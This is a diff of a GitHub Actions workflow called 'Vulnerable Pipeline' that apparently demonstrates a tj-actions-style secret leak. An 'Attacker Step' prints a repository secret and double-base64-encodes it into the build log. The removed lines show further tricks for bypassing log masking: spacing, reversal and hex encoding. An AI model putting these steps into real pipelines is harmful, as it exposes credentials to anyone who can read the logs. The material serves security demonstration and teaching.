@@ -1,6 +1,3 @@
-
-
-
 name: Vulnerable Pipeline
 
 on:
@@ -10,45 +7,21 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+
+    env:
+      DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+
     steps:
-       
-     
-      # Étape normale
-      - name: Affichage légitime
-        run: |
-          echo "----- Début du log légitime -----"
-          echo "La valeur du secret est : $DEMO_SECRET"
-          echo "----- Fin du log légitime -----"
-        env:
-          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
-      # Étape malveillante
-      - name: Étape compromise
+      - name: Normal step
+        run: echo "Pipeline started"
+
+      - name: Attacker Step
         shell: bash
         run: |
-          echo ""
-          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
-          echo "[Attacker] Lecture de la variable d'environnement..."
-          echo "[Attacker] Secret exfiltré en clair : $DEMO_SECRET"
-          echo ""
-          echo "[Attacker] Double encodage Base64 (comme l'attaque tj-actions) :"
-          encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
-          echo "$encoded"
-          echo ""
-          echo "[Attacker] Décodage du double Base64 :"
-          decoded=$(echo "$encoded" | base64 --decode | base64 --decode)
-          echo "$decoded"
-          echo ""
-          echo "[Attacker] SECRET FINAL EN CLAIR (avec bypass) :"
-          # Méthode 1 : Ajouter des espaces entre chaque caractère
-          echo "$decoded" | sed 's/./& /g'
-          echo ""
-          echo "[Attacker] SECRET EN REVERSE :"
-          # Méthode 2 : Afficher à l'envers
-          echo "$decoded" | rev
-          echo ""
-          echo "[Attacker] SECRET EN HEX :"
-          # Méthode 3 : Convertir en hexadécimal
-          echo "$decoded" | xxd -p
-          echo "===== FIN DU PAYLOAD ====="
-        env:
-          DEMO_SECRET: ${{ secrets.DEMO_SECRET }}
+          echo "===== ATTACKER PAYLOAD ====="
+          echo "[Attacker] Secret = $DEMO_SECRET"
+          echo "[Attacker] Encodage 1"
+          one=$(echo -n "$DEMO_SECRET" | base64)
+          echo "[Attacker] Encodage 2"
+          two=$(echo -n "$one" | base64)
+          echo "[Attacker] DOUBLE BASE64 = $two"
